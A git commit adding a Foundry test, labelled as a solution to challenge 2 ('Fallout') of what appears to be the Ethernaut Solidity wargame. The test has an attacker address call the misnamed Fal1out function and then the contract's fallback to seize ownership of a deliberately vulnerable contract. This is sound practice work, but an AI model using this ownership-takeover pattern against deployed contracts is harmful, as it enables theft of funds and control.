1b9557c1de543e22b6e5ed5ee4b9c811139be241
jeissoni <jeissoni_22@hotmail.com>
2022-11-09 18:18:13 -0500

    add challenge 2 solution

---
+++ test/2_Fallout/Fallout.t.sol
@@ -0,0 +1,38 @@
+pragma solidity 0.8.17;
+
+import "forge-std/Test.sol";
+import "forge-std/console.sol";
+
+import "../../src/2_Fallout/Fallout.sol";
+
+contract FalloutTest is Test {
+
+    Fallout public victim;
+    address public owner;
+    address public addr1;
+
+    function setUp() public{
+        owner = vm.addr(1);
+        addr1 = vm.addr(2);
+
+        vm.deal(addr1, 1 ether);
+
+        vm.prank(owner);
+        victim = new Fallout();
+    }
+
+    function testAttack() public {
+
+        //ingreasr valor al diccionario
+        vm.startPrank(addr1);
+
+        victim.Fal1out{value: 1 wei}();
+
+        //tomar el owner, usando la funcion fallback
+        payable(address(victim)).call{value : 1 wei}("");
+
+        vm.stopPrank();
+
+        assertEq(victim.owner(), addr1);
+    }
+}
